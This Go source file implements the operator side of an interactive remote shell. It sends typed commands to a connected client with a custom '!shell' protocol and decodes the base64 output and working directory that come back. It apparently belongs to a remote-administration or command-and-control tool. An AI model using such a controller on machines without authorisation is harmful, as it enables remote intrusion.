package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
)

const Delimiter string = "#+2%&"

type Shell struct {
	Client  *Client
	currDir string
}

func NewShell(client *Client) *Shell {

	shell := Shell{
		Client: client,
	}

	return &shell
}

// Starts a shell in a while loop. Can be exited with Ctrl + D or `exit` command.
func (shell *Shell) Start() {
	reader := bufio.NewReader(os.Stdin)

	// initialize shell
	shell.init()

	for {

		shell.promt()

		in, err := reader.ReadString('\n')

		// Ctrl + D was pressed -> user wants to leave the shell
		if err != nil {
			break
		}

		out, err := shell.exec(in)

		if err != nil {
			fmt.Println("err")
			fmt.Println(err)
			continue
		}

		fmt.Print(string(out))
	}

	shell.Close()
	fmt.Println()
}

func (shell *Shell) Close() {
	shell.Client.Send("!closeshell\n")
}

// Finds out the current path on the client and sets it.
func (shell *Shell) init() {
	res, _ := shell.Client.SendWithRes("!initshell\n")

	decoded, _ := base64.StdEncoding.DecodeString(res)

	_, wd := seperateOutAndWd(string(decoded))

	shell.currDir = wd
}

func (shell *Shell) promt() {
	fmt.Printf("%s $ ", shell.pwd())
}

// Parses and tries to execute the raw string.
func (shell *Shell) exec(raw string) ([]byte, error) {

	raw = strings.TrimSpace(raw)
	split := strings.Split(raw, " ")

	program := split[0]

	if program == "pwd\n" {
		return []byte(shell.pwd()), nil
	}

	// send to client and get response
	res, _ := shell.Client.SendWithRes(fmt.Sprintf("!shell %s\n", raw))

	decoded, err := base64.StdEncoding.DecodeString(res)

	out, wd := seperateOutAndWd(string(decoded))

	shell.currDir = wd

	return []byte(out), err
}

// Returns path to the current working directory.
func (shell *Shell) pwd() (pwd string) {
	return shell.currDir
}

func seperateOutAndWd(data string) (out string, wd string) {

	split := strings.Split(data, Delimiter)

	return split[0], split[1]
}
